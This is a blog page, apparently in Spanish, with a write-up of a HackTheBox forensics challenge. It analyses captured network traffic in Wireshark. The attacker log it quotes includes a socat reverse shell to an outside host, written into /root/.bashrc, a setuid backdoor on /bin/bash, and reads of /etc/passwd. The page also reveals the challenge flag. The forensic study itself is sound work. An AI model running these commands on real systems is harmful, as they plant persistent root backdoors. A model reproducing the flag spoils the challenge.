@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Wrong Spooky Season / HTB Forensics</title>
+    <meta name="description" content="HackTheBox forensics challenge, easy">
+    <meta name="keywords" content='blogs, informatica, forense, porfolio, hacking, jaime gómez martínez, jaime gomez martinez, jaime gomez, challenge, forensics, wireshark, htb'>
+
+    <meta property="og:url" content="https://llo0zy.github.io/writeups/wrong-spooky-season/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Wrong Spooky Season / HTB Forensics">
+    <meta property="og:description" content="HackTheBox forensics challenge, easy">
+    <meta property="og:image" content="https://media.licdn.com/dms/image/D4D03AQFoKjKng-aj_w/profile-displayphoto-shrink_200_200/0/1691074052812?e=2147483647&v=beta&t=gsKoe1n-x31WkNFjxOcCjg3dVqLsqPuJ-d_I7JpS4bE">
+    <meta property="og:image:secure_url" content="https://media.licdn.com/dms/image/D4D03AQFoKjKng-aj_w/profile-displayphoto-shrink_200_200/0/1691074052812?e=2147483647&v=beta&t=gsKoe1n-x31WkNFjxOcCjg3dVqLsqPuJ-d_I7JpS4bE">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Wrong Spooky Season / HTB Forensics">
+    <meta name="twitter:description" content="HackTheBox forensics challenge, easy">
+    <meta property="twitter:domain" content="https://llo0zy.github.io/writeups/wrong-spooky-season/">
+    <meta property="twitter:url" content="https://llo0zy.github.io/writeups/wrong-spooky-season/">
+    <meta name="twitter:image" content="https://media.licdn.com/dms/image/D4D03AQFoKjKng-aj_w/profile-displayphoto-shrink_200_200/0/1691074052812?e=2147483647&v=beta&t=gsKoe1n-x31WkNFjxOcCjg3dVqLsqPuJ-d_I7JpS4bE">
+
+    
+    <link rel="canonical" href="https://llo0zy.github.io/writeups/wrong-spooky-season/" />
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.1cad96fd391c2b9ae7d512622db1ad1da8fd7f021e784b7b7697075309969323.js" integrity="sha256-HK2W/TkcK5rn1RJiLbGtHaj9fwIeeEt7dpcHUwmWkyM="></script>
+
+    
+    
+    Porfolio web | yoshl
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        <div class="avatar">
+            <a href="https://llo0zy.github.io/">
+                <img src='https://media.licdn.com/dms/image/D4D03AQFoKjKng-aj_w/profile-displayphoto-shrink_200_200/0/1691074052812?e=2147483647&v=beta&t=gsKoe1n-x31WkNFjxOcCjg3dVqLsqPuJ-d_I7JpS4bE' alt="avatar" />
+            </a>
+        </div>
+        <div class="nav-title">
+            <a class="nav-brand" href="https://llo0zy.github.io/">Jaime Gómez</a>
+        </div>
+        
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://llo0zy.github.io/"><span data-feather='home'></span> Home </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://llo0zy.github.io/posts/"><span data-feather='book'></span> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://llo0zy.github.io/tags/"><span data-feather='tag'></span> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/Llo0zy"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://llo0zy.github.io/"><span data-feather='home'></span> Home </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://llo0zy.github.io/posts/"><span data-feather='book'></span> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://llo0zy.github.io/tags/"><span data-feather='tag'></span> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/Llo0zy"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Wrong Spooky Season / HTB Forensics</h1>
+        <small role="doc-subtitle">HackTheBox forensics challenge, easy</small>
+        <p class="post-date">
+            October 29, 2023
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/challenge">challenge</a></li>
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/forensics">forensics</a></li>
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/wireshark">wireshark</a></li>
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/htb">htb</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <h1 id="mission">Mission</h1>
+<p><em>&ldquo;I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong.&rdquo; Now there is an internal breach in the <code>Spooky Network</code> and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.</em></p>
+<h1 id="analizando-las-conversaciones">Analizando las conversaciones</h1>
+<p>Analizando las conversaciones podemos ver 2 <em>IPs</em> principales:</p>
+<ul>
+<li>Atacante: 192.168.1.180</li>
+<li>Victima: 192.168.1.166</li>
+</ul>
+<p>Al ver que todos los paquetes son por <strong>TCP</strong> y alguno por <strong>HTTP</strong> vamos a escoger un <em>handshake</em> (grupo de paquetes de red que entablan la conexión entre el cliente y servidor), en este caso el más usado es el puerto <strong>1337</strong>, un tanto sospechoso&hellip;</p>
+<h2 id="filtrando-por-el-puerto-1337">Filtrando por el puerto 1337</h2>
+<p>Para esto usaremos el filtro que tenemos integrado en wireshark y pondremos:</p>
+<pre><code class="language-wireshark" data-lang="wireshark">tcp.port == 1337
+</code></pre><p>Y al primer paquete le haremos un seguimiento de <strong>TCP</strong>, para ello haremos click derecho y pulsaremos: <strong>FOLLOW &gt; TCP STREAM</strong>.</p>
+<h2 id="analizando-logs">Analizando logs</h2>
+<p>Al seguir el paquete noos encontramos el siguiente archivo, que es un registro de comandos:</p>
+<pre><code class="language-wireshark" data-lang="wireshark">id
+uid=0(root) gid=0(root) groups=0(root)
+
+groups
+root
+
+uname -r
+5.18.0-kali7-amd64
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
+
+find / -perm -u=s -type f 2&gt;/dev/null
+/bin/su
+/bin/umount
+/bin/mount
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/chsh
+
+echo 'socat TCP:192.168.1.180:1337 EXEC:sh' &gt; /root/.bashrc &amp;&amp; echo &quot;==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS&quot; | rev &gt; /dev/null &amp;&amp; chmod +s /bin/bash
+
+ls -lha
+total 20K
+drwxr-xr-x 1 root root 4.0K Oct 10 17:28 .
+drwxr-xr-x 1 root root 4.0K Oct 10 17:28 ..
+-rwxrwx--- 1 root root 1.8K Oct 8 00:04 pom.xml
+drwxr-xr-x 3 root root 4.0K Oct 10 17:27 src
+drwxr-xr-x 1 root root 4.0K Oct 10 17:28 target
+</code></pre><p>Donde nos llama la atención el siguiente comando, especificamente la parte de <em>Base64</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#39;socat TCP:192.168.1.180:1337 EXEC:sh&#39;</span> &gt; /root/.bashrc <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS&#34;</span> | rev &gt; /dev/null <span style="color:#f92672">&amp;&amp;</span> chmod +s /bin/bash
+</code></pre></div><h2 id="desencriptando-la-flag-base64">Desencriptando la flag (Base64)</h2>
+<p>Si probamos a desencriptarla nos encontramos con la flag!!!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS&#34;</span> | rev | base64 -d 
+
+HTB<span style="color:#f92672">{</span>j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!<span style="color:#f92672">}</span>
+</code></pre></div><p>Y recuerda la pantera que no pasa hambre no caza</p>
+
+        </p>
+        
+    </div>
+
+    <div class="prev-next">
+        
+            
+                
+<div class="prev-post">
+    <p>
+        <a href="/writeups/export/">
+            &#8592;
+            Previous:
+            Export / HTB Forensics
+        </a>
+    </p>
+    <p class="prev-post-date">
+        October 13, 2023
+    </p>
+</div>
+
+
+
+<div class="next-post">
+    <p>
+        <a href="/writeups/red-miners/">
+            Next:
+            Red Miners / HTB Forensics
+            &#8594;
+        </a>
+    </p>
+        <p class="next-post-date">
+            October 29, 2023
+        </p>
+</div>
+
+
+            
+        
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#mission">Mission</a></li>
+    <li><a href="#analizando-las-conversaciones">Analizando las conversaciones</a>
+      <ul>
+        <li><a href="#filtrando-por-el-puerto-1337">Filtrando por el puerto 1337</a></li>
+        <li><a href="#analizando-logs">Analizando logs</a></li>
+        <li><a href="#desencriptando-la-flag-base64">Desencriptando la flag (Base64)</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+    <span>
+        © 2023 - All rights reserved
+    </span>
+</footer>
+</body>
+</html>
